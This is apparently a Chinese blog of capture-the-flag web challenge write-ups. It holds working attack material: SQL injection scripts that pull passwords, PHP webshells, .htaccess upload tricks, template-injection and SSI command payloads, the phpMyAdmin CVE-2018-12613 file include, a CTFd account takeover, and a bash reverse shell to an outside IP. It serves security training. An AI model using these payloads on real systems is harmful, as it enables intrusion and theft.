弱类型比较，传两个值的md5为0e开头的即可
`?a=QNKCDZO&b=s878926199a`
或者传数组也行
`?a[]=1&b[]=2`
![](https://img-blog.csdnimg.cn/20200318232407164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后传入两个数组即可得到flag
`param1[]=1&param2[]=2`
![](https://img-blog.csdnimg.cn/20200318232556599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[【Jarvis OJ】Login--password='".md5($pass,true)."'](https://www.jianshu.com/p/12125291f50d)
[[BJDCTF2020]Easy MD5](https://www.cnblogs.com/wangtanzhi/p/12304899.html)

## [ACTF2020 新生赛]BackupFile

**提示：Try to find out source file!**
我就开始了目录扫描，结果没扫到，查看wp发现是备份文件/index.php.bak，得到了源码

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```
key要属于数字型并与123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3相等，为弱类型，传`?key=123`即可

![](https://img-blog.csdnimg.cn/20200318234223974.png)


## [GWCTF 2019]我有一个数据库
由于是数据库，尝试/phpmyadmin，进入
![](https://img-blog.csdnimg.cn/2020031910090433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
看wp得出这个是：**phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞**
影响版本：4.8.0——4.8.1
`/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag`

%253f是问号的双重url编码

![](https://img-blog.csdnimg.cn/20200319101155255.png)

可参考：[phpMyadmin后台任意文件包含漏洞分析(CVE-2018-12613)](https://www.cnblogs.com/-mo-/p/11447331.html)


## [ACTF2020 新生赛]Upload
和之前极客大挑战一样的题，上传后缀为phtml即可
![](https://img-blog.csdnimg.cn/20200319102826210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
连上蚁剑，即可得到flag
![](https://img-blog.csdnimg.cn/20200319103020700.png)
## [安洵杯 2019]easy_serialize_php
给出了源码，去看了wp
```php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
```
首先查看phpinfo有什么`?f=phpinfo`
![](https://img-blog.csdnimg.cn/20200319104913915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
本题是关键字被置空导致长度变短，后面的值的单引号闭合了前面的值的单引号，导致一些内容逃逸。
我们利用变量覆盖post一个：
`_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`
phpflag被替换为空后，$serialize_info的内容为
`a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}`
刚好把后面多余的img部分截断掉
![](https://img-blog.csdnimg.cn/2020041023214542.png)
![](https://img-blog.csdnimg.cn/20200410235411645.png)
最后POST提交：`_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}`
![](https://img-blog.csdnimg.cn/20200410235641395.png)
![](https://img-blog.csdnimg.cn/20200410235836381.png)
参考：[王叹之：[安洵杯 2019]easy_serialize_php](https://www.cnblogs.com/wangtanzhi/p/12261610.html)
[[安洵杯 2019]easy_serialize_php](https://blog.csdn.net/chasingin/article/details/104189711)

## [BJDCTF2020]Mark loves cat

界面很炫，看不出名堂，看wp发现又是git泄露
```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){     //GET方式传flag只能传一个flag=flag
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){    //GET和POST其中之一必须传flag
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){    //GET和POST传flag,必须不能是flag=flag
    exit($is);
}

echo "the flag is: ".$flag;
```
是$\$变量覆盖的问题
首先我们post值：`$flag=flag`，那么就变为了$$flag=flag
get传参为`yds=flag`这样随着源码执行以后就变成了 \$yds=\$flag；这里的$flag是真的flag，那么\$\$x = $\$y，也就是$yds=flag{XXXXXX}。
又满足
```php
if(!isset($_GET['flag']) && !isset($_POST['flag'])){    
    exit($yds);
}
```
即可输出$yds，为flag
![](https://img-blog.csdnimg.cn/2020031911380469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## [CISCN2019 总决赛 Day2 Web1]Easyweb
查看robots.txt得到信息
![](https://img-blog.csdnimg.cn/20200319192723652.png)
没找到文件，看wp发现是image.php.bak
```php
<﻿?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```
![](https://img-blog.csdnimg.cn/20200319193257351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
对单引号进行了过滤，无法闭合单引号，所以我们用`\0`来转义掉它的单引号。`\0`经过addslashes函数会先变成`\\0`,然后经过str_replace函数，会变成`\`，这样，就把id后面的单引号给转义了。
```sql
select * from images where id='\' or path=' or 1=1#    //闭合成功
```
师傅脚本如下：
```python
import requests

url = "http://9ab2997c-d180-475a-997b-cd035771b930.node3.buuoj.cn/image.php"
result = ''

for x in range(0, 100):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        #payload = " or id=if(ascii(substr((database()),%d,1))>%d,1,0)#" % (x, mid)
        #payload = " or id=if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),%d,1))>%d,1,0)#" % (x, mid)
        #users
        #payload = " or id=if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),%d,1))>%d,1,0)#" % (x, mid)
        #password
        payload = " or id=if(ascii(substr((select password from users limit 0,1),%d,1))>%d,1,0)#" % (x, mid)
        params = {
            'id':'\\0',
            'path':payload
        }
        response = requests.get(url, params=params)
        if b'JFIF' in response.content:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)
```
得到密码：`f6be5fb688d9a417d057`,登录发现是文件上传
**因为不允许上传带php的文件名，我们用php短标签来绕过：**
`<?php @eval($_POST['a']);?>`可以用`<?=@eval($_POST['a']);?>`来代替。这个文件名，会被写入日志文件中去，然后用菜刀连接。
抓包传入
![](https://img-blog.csdnimg.cn/20200319211317752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
蚁剑连接，就可以在根目录得到flag
![](https://img-blog.csdnimg.cn/20200319211310751.png)

参考：
[Mustapha Mond ：刷题记录：[CISCN2019 总决赛 Day2 Web1]Easyweb](https://www.cnblogs.com/20175211lyz/p/11481476.html)
[王叹之：[CISCN2019 总决赛 Day2 Web1]Easyweb](https://www.cnblogs.com/wangtanzhi/p/12253918.html)


## [BJDCTF2020]The mystery of ip

XFF头的ssti模板注入，不会，看wp
![](https://img-blog.csdnimg.cn/20200320162624115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
首先发一个包添加：
`X-Forwarded-For: test`
![](https://img-blog.csdnimg.cn/20200319213116982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
可行，那么就开始执行语句了
```java
X-Forwarded-For: {{system('ls')}}
```
![](https://img-blog.csdnimg.cn/20200319213332328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后在根目录得到flag，
```java
X-Forwarded-For: {{system('cat /flag')}}
```
![](https://img-blog.csdnimg.cn/20200319213433949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

## [SUCTF 2019]EasyWeb

题目给出了源码：

```php
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```
借鉴师傅的文章：
1. 代码中没有引号的字符都自动作为字符串：
php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。
就是`$_GET['cmd']`和`$_GET[cmd]`都可以
2. Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号
3. [PHP中的的大括号(花括号{})使用详解](https://blog.csdn.net/ityang521/article/details/60609499)
`$str{4}`在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理。
那么使用`${_GET}{cmd}`

![](https://img-blog.csdnimg.cn/20200411130214538.png)
最后使用

```php
?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag
```
![](https://img-blog.csdnimg.cn/20200411125847704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
之后就是上传getshell了，php版本为7.2所以，不能用`<script>`标签绕过`<?`的过滤了，使用base64编码绕过，上传.htaccess：
```php
#define width 1
#define height 1
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.abc"
```
使用师傅脚本上传：
**这里GIF89a后面那个12是为了补足8个字节，满足base64编码的规则**
```python
import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .abc
php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_76d9f00467e5ee6abc3ca60892ef304e/shell.abc"
"""
shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['a']);?>")
url = "http://e0ddff1c-0e40-477c-9983-2527568ece3b.node3.buuoj.cn?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&%fe=get_the_flag"

files = {'file':('.htaccess',htaccess,'image/jpeg')}
data = {"upload":"Submit"}
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = {'file':('shell.abc',shell,'image/jpeg')}
response = requests.post(url=url, data=data, files=files)
print(response.text)
```
![](https://img-blog.csdnimg.cn/2020041114000971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后一关：绕过open_basedir/disable_function，[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720)，借鉴师傅的文章：
>open_basedir是php.ini中的一个配置选项
它可将用户访问文件的活动范围限制在指定的区域，
假设open_basedir=/home/wwwroot/home/web1/:/tmp/，
那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。
注意用open_basedir指定的限制实际上是前缀,而不是目录名。
举例来说: 若"open_basedir = /dir/user", 那么目录 "/dir/user" 和 "/dir/user1"都是可以访问的。
所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。

接下来使用payload找flag：
```php
?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));
```
![](https://img-blog.csdnimg.cn/20200411142156783.png)
读取flag
```php
?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));
```
![](https://img-blog.csdnimg.cn/20200411142259280.png)
参考：
[Mustapha Mond ：刷题记录：[SUCTF 2019]EasyWeb(EasyPHP)](https://www.cnblogs.com/20175211lyz/p/11488051.html)
[SUCTF 2019 Easyweb](https://github.com/team-su/SUCTF-2019/blob/master/Web/easyweb/wp/SUCTF%202019%20Easyweb.md)
[Cyc1e：2019 SUCTF Web writeup](https://www.jianshu.com/p/fbfeeb43ace2)
[王叹之：[SUCTF 2019]EasyWeb](https://www.cnblogs.com/wangtanzhi/p/12250386.html)


## [V&N2020 公开赛]HappyCTFd
在user里只有admin，那么应该就是要使用admin登录，参考wp得
利用方式：
1. 利用添加空格绕过限制来注册一个与受害者用户名相同的账号
2. 生成忘记密码链接发送到自己的邮箱
3. 将自己的账号的用户名改成与被攻击者不相同的用户名
4. 用邮箱中收到的链接更改密码即可。

首先在内网注册一个邮箱账号
![](https://img-blog.csdnimg.cn/20200320133154573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在注册处使用admin 注册，空格绕过
![](https://img-blog.csdnimg.cn/20200320133645512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在登录处选择找回密码
![](https://img-blog.csdnimg.cn/20200320134013695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发送完后更改自己的账号名称
![](https://img-blog.csdnimg.cn/20200320134147157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在邮箱收到网址，更改密码即可登录admin账户，
![](https://img-blog.csdnimg.cn/20200320134835660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

然后就是找flag了，最后找到了一个miaoflag.txt的文件，下载即可得到flag
![](https://img-blog.csdnimg.cn/20200320134626616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：
[CVE-2020-7245 CTFd v2.0.0 – v2.2.2 account takeover分析](https://www.colabug.com/2020/0204/6940556/)
[[V&N2020 公开赛]](https://www.cnblogs.com/W4nder/p/12390204.html)

## [BJDCTF2020]ZJCTF，不过如此

u1s1，很拽，和ZJCTF出的的逆转思维很像，给出了源码：
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
使用伪协议读取
`?text=php://input` 然后POST方式提交 I have a dream 或者 `?text=data://text/plain,I have a dream`
`&file=php://filter/convert.base64-encode/resource=next.php`
获得next.php的base64编码
![](https://img-blog.csdnimg.cn/2020032015082672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
看wp发现是preg_replace的/e漏洞
`?\S*=xxxxxx`这样后面的xxx就会被当作命令执行
### 方法1：使用源码给的getFlag函数
`?\S*=${getflag()}&cmd=show_source("/flag");`
![](https://img-blog.csdnimg.cn/20200320152025450.png)
### 方法2：构造post传参
`?\S*=${eval($_POST[pass])}`
POST提交：
`pass=system("cat /flag");`
![](https://img-blog.csdnimg.cn/20200320152305135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考链接：[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)

## [BJDCTF2020]Cookie is so stable
不会，看wp又是一个Twig模板注入
输入
```java
{{7*'7'}}
```
![](https://img-blog.csdnimg.cn/20200320163402173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么就抓包查看发现注入点是user
师傅的payload：

```java
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}};
```

![](https://img-blog.csdnimg.cn/20200320164841696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)

参考：
[服务端模板注入攻击](https://zhuanlan.zhihu.com/p/28823933)
[[BJDCTF2020]Cookie is so stable](https://www.cnblogs.com/wangtanzhi/p/12330542.html)

## [HITCON 2017]SSRFme
给出了源码：
```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```
具体为什么这样可看链接
创建一个linux-labs，首先查看ip
![](https://img-blog.csdnimg.cn/20200411195122638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在www/html下创建x.txt写入代码如下：
`bash -i >& /dev/tcp/174.1.246.212/6666 0<&1 2>&1`
然后操作之
```powershell
?url=http://174.1.246.212/x.txt&filename=a
?url=&filename=bash a|
?url=file:bash a|&filename=xxx
```
监听端口：`nc -lvp 6666`
![](https://img-blog.csdnimg.cn/20200411202718475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后在根目录执行readflag
![](https://img-blog.csdnimg.cn/20200411203018844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[Hitcon2017 Web Writeup](http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/)
[HITCON2017-writeup整理](https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#ssrfme)
[[hitcon2017] SSRF Me复现](https://www.jianshu.com/p/3f82685f56a8)

## [极客大挑战 2019]FinalSQL
~~看完wp~~这题是盲注，而且使用异或^
异或是一种逻辑运算，运算法则简言之就是：
**两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null**

`?id=1^0^1`，返回id=0的结果，ERROR
![](https://img-blog.csdnimg.cn/20200320170141862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
`?id=1^1^1`返回id =1的结果
![](https://img-blog.csdnimg.cn/20200320170422417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么构造 `?id=1^(length(database())>3)^1`，返回的是id=1的结果，即(length(database())>3) = 1，是真的，说明当前数据库的长度大于3
师傅脚本：
```php
#二分法要快很多
# -*- coding: UTF-8 -*-
import re
import requests
import string
 
url = "http://649d4d3a-b8a5-449d-82fa-aad24102ca6d.node3.buuoj.cn/search.php"
flag = ''
def payload(i,j):
    # sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1"%(i,j)                                #数据库名字          
    # sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)^1"%(i,j)           #表名
    # sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1"%(i,j)        #列名
    sql = "1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1"%(i,j)
    data = {"id":sql}
    r = requests.get(url,params=data)
    # print (r.url)
    if "Click" in r.text:
        res = 1
    else:
        res = 0
 
    return res
 
def exp():
    global flag
    for i in range(1,10000) :
        print(i,':')
        low = 31
        high = 127
        while low <= high :
            mid = (low + high) // 2
            res = payload(i,mid)
            if res :
                low = mid + 1
            else :
                high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
            break
        # print (f)
        flag += chr(f)
        print(flag)
 
exp()
print('flag=',flag)
```
师傅的二分法脚本跑的是真快
![](https://img-blog.csdnimg.cn/2020032017192866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：
[[极客大挑战 2019] SQL (二)](https://www.jianshu.com/p/39f8f0545777)
[[极客大挑战 2019]FinalSQL](https://www.cnblogs.com/wangtanzhi/p/12305052.html)

## [BJDCTF2020]EasySearch
没思路，又登不上去，看wp发现是swp泄露
```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```
password前6个字符的md5加密值等于6d0bc1，师傅脚本如下：
```python
import hashlib
list='0123456789'
for a in list:
    for b in list:
        for c in list:
            for d in list:
                for e in list:
                    for f in list:
                        for g in list:
                            str1 = (a+b+c+d+e+f+g)
                            value = hashlib.md5(str1.encode()).hexdigest()
                            if value[0:6] == '6d0bc1':
                                print(str1)
```
得到三个数，随便选一个就行
![](https://img-blog.csdnimg.cn/20200320173127527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
抓包发现返回包有一个地址
![](https://img-blog.csdnimg.cn/20200320173422310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问，wp说是SSI解析漏洞
![](https://img-blog.csdnimg.cn/20200320173657619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在username变量中传入ssi语句来远程执行系统命令
`<!--#exec cmd="命令"-->`
先ls没发现有用信息，使用`<!--#exec cmd="ls ../"-->`
![](https://img-blog.csdnimg.cn/20200320174308179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现flag
![](https://img-blog.csdnimg.cn/20200320174440476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
接下来读取即可`<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"-->`
![](https://img-blog.csdnimg.cn/20200320174614142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
参考：[[BJDCTF2020]EasySearch](https://www.cnblogs.com/wkzb/p/12391211.html)

## [V&N2020 公开赛]CHECKIN
![](https://img-blog.csdnimg.cn/20200322163753681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
题目给出了源码，看赵师傅wp
```python
from flask import Flask, request
import os
app = Flask(__name__)

flag_file = open("flag.txt", "r")
# flag = flag_file.read()
# flag_file.close()
#
# @app.route('/flag')
# def flag():
#     return flag
## want flag? naive!

# You will never find the thing you want:) I think
@app.route('/shell')
def shell():
    os.system("rm -f flag.txt")
    exec_cmd = request.args.get('c')
    os.system(exec_cmd)
    return "1"

@app.route('/')
def source():
    return open("app.py","r").read()

if __name__ == "__main__":
    app.run(host='0.0.0.0')

```
